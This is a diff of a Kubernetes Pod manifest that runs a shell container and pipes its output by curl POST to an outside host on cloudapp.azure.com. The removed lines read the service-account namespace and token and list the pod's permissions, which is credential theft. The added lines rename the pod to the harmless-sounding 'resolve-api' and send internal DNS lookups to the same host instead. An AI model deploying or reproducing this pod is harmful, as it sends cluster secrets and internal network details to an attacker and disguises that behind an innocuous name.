@@ -1,19 +1,18 @@
 apiVersion: v1
 kind: Pod
 metadata:
-  name: potter-v6
+  name: resolve-api
 spec:
   containers:
     - name: shell
-      image: bitnami/kubectl:latest
+      image: alpine
       command:
         - sh
         - -c
         - |
-          apt update && apt install -y curl;
+          apk add --no-cache curl bind-tools;
           {
-            echo '>> NAMESPACE:' && cat /var/run/secrets/kubernetes.io/serviceaccount/namespace;
-            echo '>> TOKEN:' && cat /var/run/secrets/kubernetes.io/serviceaccount/token;
-            echo '>> CAN-I:' && kubectl auth can-i --list 2>&1;
+            echo '>> RESOLVENDO API INTERNA';
+            nslookup kubernetes.default;
           } | curl -X POST --data-binary @- http://potter-maga.brazilsouth.cloudapp.azure.com:8080
   restartPolicy: Never
